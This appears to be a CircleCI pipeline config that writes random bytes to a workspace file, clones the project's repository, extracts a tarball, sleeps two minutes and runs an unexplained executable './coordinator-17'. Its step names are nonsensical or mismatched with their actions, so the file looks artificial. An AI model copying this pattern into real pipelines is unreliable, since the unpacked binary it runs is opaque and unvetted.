version: 2.1

jobs:
  cfg_toggle_view:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Tote bin weigh in
          command: |
            mkdir -p /tmp/dne
            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4K count=100 conv=noerror 2>/dev/null > /tmp/dne/7f3ad8e29f64; true
            echo "----"; echo "ok $(wc -c </tmp/dne/7f3ad8e29f64)"; echo "----"
      - persist_to_workspace:
          root: /tmp/dne
          paths:
            - '7f3ad8e29f64'
  strated-90:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/dne
      - run:
          name: Close workspace
          command: |
            # key=value
            echo "path=/tmp/dne/7f3ad8e29f64 bytes=$(wc -c < /tmp/dne/7f3ad8e29f64 2>/dev/null || echo 0) hash=$(md5sum /tmp/dne/7f3ad8e29f64 2>/dev/null | cut -c1-8)"
      - run:
          name: Fetch main branch
          command: git clone --depth 3 --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Hydrate workspace
          command: tar -xzvf backups-release.tgz
      - run:
          no_output_timeout: 15m
          command: sleep 120
      - run:
          command: sh -c "./coordinator-17"
